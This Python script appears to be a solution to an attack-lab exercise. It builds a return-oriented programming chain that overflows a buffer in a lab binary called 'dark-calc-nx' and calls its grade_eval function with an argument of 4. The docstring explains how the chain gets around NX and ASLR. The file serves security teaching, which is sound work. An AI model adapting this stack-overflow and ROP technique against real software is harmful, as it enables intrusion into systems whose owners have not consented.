#!/usr/bin/env python3
"""Task 6: ROP chain for attack/dark-calc-nx (NX + ASLR, non-PIE).

The stack is non-executable and its address is randomised, but the main image is
a non-PIE ET_EXEC linked at 0x400000, so its code addresses are fixed and ASLR is
irrelevant.  We overflow input() and return into a `pop rdi; ret` gadget (entered
one byte into __libc_csu_init's epilogue), pass grade = 4, then grade_eval(),
then input()'s empty-input exit path for a clean exit(0).

A plain `ret` between the argument and grade_eval keeps rsp % 16 == 8 at
grade_eval entry (the same state a normal `call` produces), so its printf does
not fault on `movaps` regardless of the glibc build.
"""
import os
import struct
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import attacklab

HERE = os.path.dirname(os.path.abspath(__file__))
ELF = attacklab.Elf(os.path.join(HERE, "attack", "dark-calc-nx"))

POP_RDI = attacklab.pop_rdi_ret(ELF)    # 0x401a33  (pop rdi; ret)
RET = attacklab.ret_gadget(ELF)         # 0x401a34  (plain ret, alignment shim)
GRADE_EVAL = ELF.symbol("grade_eval")   # 0x401978
EXIT0 = attacklab.exit0_call_site(ELF)  # 0x4018aa  (mov edi,0; call exit@plt)

chain = (
    struct.pack("<Q", POP_RDI) +
    struct.pack("<Q", 4) +
    struct.pack("<Q", RET) +
    struct.pack("<Q", GRADE_EVAL) +
    struct.pack("<Q", EXIT0)
)

payload = b"R" * 24 + chain + b"\n"
assert b"\n" not in payload[:-1]
sys.stdout.buffer.write(payload)
